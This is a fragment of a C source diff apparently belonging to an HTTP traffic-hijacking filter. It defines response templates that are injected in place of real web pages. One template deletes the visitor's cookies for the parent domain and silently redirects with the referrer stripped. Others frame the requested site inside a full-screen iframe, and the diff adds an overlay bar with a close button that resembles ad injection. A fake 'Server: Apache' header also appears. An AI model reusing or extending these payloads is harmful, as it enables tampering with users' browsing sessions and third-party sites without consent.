@@ -70,13 +70,13 @@ enum filter_result {
 #define HTTP_RESP_NOREFERER_BEGIN "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body><script type=\"text/javascript\">var u='http://"
 #define HTTP_RESP_NOREFERER_END "', ua=navigator.userAgent.toLowerCase(), hs=window.location.host, n=hs.indexOf(\".\"), d=hs.substr(n+1);var cc=document.cookie.split(\";\");for(var i=0;i<cc.length;i++){var name=cc[i].split(\"=\")[0];if(\"apxlp\"!=name){document.cookie=name+\"=; domain=\"+d+\"; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;\"}}if(ua.indexOf(\"applewebkit\")>0){var h=document.createElement(\"a\");h.rel=\"noreferrer\";h.href=u;document.body.appendChild(h);var evt=document.createEvent(\"MouseEvents\");evt.initEvent(\"click\",true,true);h.dispatchEvent(evt)}else{document.write('<meta http-equiv=\"Refresh\" Content=\"0; Url='+u+'\">')}</script></body></html>"
 #if 1
-#define HTTP_RESP_JS_IFRAME_BEGING "<html><head><script type=\"text/javascript\">function s(){"
-#define HTTP_RESP_JS_IFRAME_MIDDLE "}</script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"s()\"><iframe id=\"f\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
+#define HTTP_RESP_JS_IFRAME_BEGING "<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"/><title></title><style>body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#fff;color:#333;opacity:.8;z-index:3;right:2px;top:50%;margin-top:-10px;line-height:20px;text-align:center;width:20px;font-size:14px}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}#x{position:fixed;z-index:2;bottom:0px;width:100%;height:60px}</style><script type=\"text/javascript\">function s(){"
+#define HTTP_RESP_JS_IFRAME_MIDDLE "}</script></head><body style='background-color:transparent; margin:0px; height:100%' onload=\"s()\"><div id=i><iframe src=\"http://"
 #else
 #define HTTP_RESP_JS_IFRAME_BEGING "<!DOCTYPE html><html><head><script type=\"text/javascript\" src=\""
 #define HTTP_RESP_JS_IFRAME_MIDDLE "\"></script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"setParameter()\"><iframe id=\"frame_A\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
 #endif
-#define HTTP_RESP_JS_IFRAME_END "?rsv_upd=1\"></iframe></body></html>"
+#define HTTP_RESP_JS_IFRAME_END "?rsv_upd=1\" width='100%' height='100%' frameborder='0'></iframe></div></body></html>"
 
 #define HTTP_RESP_JS_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nConnection: close\r\nContent-Type: application/javascript\r\nCache-Control: no-cache"
 #define HTTP_RESP_JS_BEGING "var u='http://"
